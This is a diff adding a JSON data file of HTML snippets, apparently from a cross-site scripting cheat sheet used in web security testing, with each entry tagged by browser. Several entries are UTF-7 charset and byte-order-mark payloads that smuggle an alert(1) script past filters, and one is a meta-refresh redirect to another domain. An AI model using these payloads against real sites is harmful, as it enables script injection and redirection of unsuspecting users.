@@ -1,0 +1,84 @@
+[
+    {
+        "description": "Redirect to a different domain",
+        "code": "<meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Meta charset attribute UTF-7",
+        "code": "<meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
+        "browsers": [
+            "edge"
+        ]
+    },
+    {
+        "description": "Meta charset UTF-7",
+        "code": "<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
+        "browsers": [
+            "edge"
+        ]
+    },
+    {
+        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "code": "+\/v8\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
+        "browsers": [
+            "edge"
+        ]
+    },
+    {
+        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "code": "+\/v9\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
+        "browsers": [
+            "edge"
+        ]
+    },
+    {
+        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "code": "+\/v+\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
+        "browsers": [
+            "edge"
+        ]
+    },
+    {
+        "description": "UTF-7 BOM characters (Has to be at the start of the document)",
+        "code": "+\/v\/\n+ADw-script+AD4-alert(1)+ADw-\/script+AD4-",
+        "browsers": [
+            "edge"
+        ]
+    },
+    {
+        "description": "Upgrade insecure requests",
+        "code": "<meta http-equiv=\"Content-Security-Policy\" content=\"upgrade-insecure-requests\">",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Disable JavaScript via iframe sandbox",
+        "code": "<iframe sandbox src=\"\/\/portswigger-labs.net\"><\/iframe>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Disable referer",
+        "code": "<meta name=\"referrer\" content=\"no-referrer\">",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    }
+]
